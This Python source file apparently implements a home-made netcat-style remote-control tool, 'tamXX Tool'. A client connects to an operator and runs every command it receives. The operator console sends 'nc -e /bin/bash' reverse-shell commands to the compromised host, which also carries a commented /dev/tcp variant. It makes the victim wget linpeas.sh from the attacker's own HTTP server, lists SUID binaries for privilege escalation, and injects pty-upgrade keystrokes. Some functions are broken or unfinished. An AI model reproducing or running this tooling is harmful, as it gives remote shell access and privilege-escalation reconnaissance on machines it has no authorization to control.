#!/usr/bin/env python3

import socket
import sys, os
import threading
import time
import subprocess
import signal
import random
import keyboard
import pynput
from pynput.keyboard import Key, Controller


class netcat(object):
    listener = False
    clientHandler = False
    prompt = False
    port = 4444
    target = ""
    home = ""
    user = ""
    tag = ""
    value = 'local'
    bufferSize = 2**12


    
    def usage(self,value):
        if value == 'local':
            print("""
            tamXX Tool :\n
            [OPTIONS] :
            \t\t-l , --listen\t\t\t-     listen on [host]:[port] for incoming connections
            \t\t--target [IP]\t\t\t-     target
            \t\t-p , --port [PORT]\t\t\t-     port
            \t\t--prompt\t\t\t-     initialize prompt
            \t\t-h , --help\t\t\t-     get some help ;)
            """)
            sys.exit(0)
        elif value == 'rhost':
            print("""
                WE ARE ON ! WHAT CAN I DO ?
                [OPTIONS] : 
                \t\tFirst, you can execute almost same commands like real shell! 
                \t\thelp\t\tget some help ;)
                \t\tsuid\t\tget all suid binaries !
                \t\tlinpeas\t\tupload linpeas.sh on machine
                \t\tshell\t\tget full interactive shell
                """)


        

    def main(self):

        listArgs = " ".join(sys.argv[1:]).split('-')
        while ("" in listArgs):
            listArgs.remove("")
        newListArgs = []
        for arg in listArgs:
            arg = arg.replace(' ','%')
            newListArgs.append(arg)
        
        if not len(sys.argv[1:]):
            self.usage(self.value)
            
        for opt in newListArgs:
            #print(opt)
            if opt == "listen%" or opt == "l%" or opt == "listen" or opt == "l":
                self.listener = True
            elif opt == "h%" or opt == "help%" or opt == "help" or opt == "h":
                self.usage(self.value)
            elif "p%" in opt or "port%" in opt:
                opts = opt.split("%")
                self.port = int(opts[1])
            elif "target%" in opt:
                opts = opt.split("%")
                self.target = opts[1]
            elif opt == "prompt%" or opt == "prompt":
                self.clientHandler = True
            else:
                print("ERROR")
                self.usage(self.value)


        if self.listener:
            self.serverLoop()
        if self.clientHandler:
            self.clientLoop()




    def clientLoop(self):
        global length
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target,self.port))
        while True:
            recv = s.recv(self.bufferSize)
            recv = recv.decode('utf-8')
            if 'cd' in recv:
                recv = recv.split(' ')
                param = ''.join(recv[1:])
                try:
                    os.chdir(param)
                    s.send(os.getcwd().encode())
                except:
                    s.send(b"Error ! ")
            elif "exit" in recv or "quit" in recv:
                s.close()
                break
            elif 'whoami' in recv or "pwd" in recv:
                output = subprocess.getoutput(recv)
                s.send(output.encode())
            else:
                #print(recv)
                #res = self.bash_(recv)
                #print(res)
                #s.send(res.encode())



                output = recv+'\n\n'
                output = subprocess.getoutput(recv)+ '\n'
                s.send(output.encode())



                #CMD = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                #s.send(CMD.stdout.read())
                #s.send(CMD.stderr.read())

    def serverLoop(self):
        if not len(self.target):
           self.target = "0.0.0.0"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.target,self.port))
        s.listen(1)
        print("Listening : [%s]:[%s]"%(self.target,self.port))
        conn, addr = s.accept()
        print("[+] Connection from : ",addr)
        print("\nType help if you want some tips ! \n")
        self.init(conn)
        while True:
            command = input("%s@[%s] %s "%(self.user,self.home,self.tag))
            if 'clear' in command:
                os.system('clear')
            elif 'exit' in command or 'quit' in command or 'terminate' in command:
                conn.send(b'exit')
                conn.close()
                break
            elif 'help' in command:
                self.value = 'rhost'
                self.usage(self.value)
            elif 'cd' in command:
                conn.send(command.encode())
                recv = conn.recv(self.bufferSize).decode()
                if "Error" in recv:
                    print("Error")
                else:
                    self.home = recv
            elif command == "":
                print('')
            elif command == "linpeas":
                self.linpeas(conn)
            elif command == "suid":
                self.listSuid(conn)
            elif command == "shell":
                self.shell(conn)
            else:
                conn.send(command.encode())
                fini = "false"
                while fini == "false":
                    recv = conn.recv(self.bufferSize).decode()
                    print(recv)
                    if len(recv) < self.bufferSize:
                        fini = "true"
    
    


#####################################################
####
####
####
####            functions
####
####
####
#####################################################





###################### upload


    def shell(self,conn):
        command = "which nc"
        conn.send(command.encode())
        recv = conn.recv(self.bufferSize).decode()
        if recv != '':
            port = random.randint(1000,10000)
            name = socket.gethostname()
            ip = socket.gethostbyname(name)
            subprocess.call(["terminator","-x","nc -lnvp %s"%(port)])
            time.sleep(1)
            cmd = "nc -e /bin/bash %s %s &"%(ip,port)
            conn.send(cmd.encode())
            keyboard = Controller()
            string = """python -c 'import pty;pty.spawn("/bin/bash")'"""
            for s in string:
                keyboard.press(s)
            keyboard.press(Key.enter)
            #keyboard.press_and_release('alt','tab')
            #keyboard.write('toto')
            #keyboard.press('enter')
            #keyboard.write('''export TERM=xterm''')
            #keyboard.press('enter')
        else:
            print('toto')
            #cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1 &"

    def listSuid(self,conn):
        recv = recv.split(' ')
        param = ''.join(recv[1:])
        out = subprocess.getoutput("find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null")
        s.send(param.encode())


    def linpeas(self,conn):
        l = ["wget","nc"]
        for cmd in l:
            command = "which " + cmd
            conn.send(command.encode())
            recv = conn.recv(self.bufferSize).decode()
            if recv == '':
                print(f" {cmd} : NOT AVAILABLE")
            else:
                print(' %s: %s POTIENTIAL UPLOAD\n'%(cmd.replace("\n",""),recv.replace("\n","")))
                if "wget" in cmd:
                    self.wgetLinpeas(conn)
                    break
                elif "nc" in cmd:
                    self.ncLinpeas(conn)
                    break


    def wgetLinpeas(self,conn):
        os.chdir('/root/aht/peas')
        CMD = subprocess.Popen("python3 -m http.server", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        pid = CMD.pid + 1
        time.sleep(2)
        name = socket.gethostname()
        ip = socket.gethostbyname(name)
        command = "wget http://%s:8000/linpeas.sh"%(ip)
        conn.send(command.encode())
        while True:
            response = conn.recv(self.bufferSize).decode()
            print(response)
            if len(response) < self.bufferSize:
                os.kill(pid, signal.SIGTERM) 
                break




    def ncLinpeas(self,conn):
        print('ok')




################## getters

    def getHome(self,conn):
        conn.send(b'pwd')
        response = conn.recv(self.bufferSize).decode()
        return response

    def getUser(self,conn):
        conn.send(b'whoami')
        response = conn.recv(self.bufferSize).decode()
        return response

    def init(self,conn):
        self.home = self.getHome(conn)
        self.user = self.getUser(conn)
        if self.user != 'root':
            self.tag = "$"
        else:
            self.tag = "#"
 

        
if __name__ == "__main__":
   ncat = netcat()
   ncat.main()

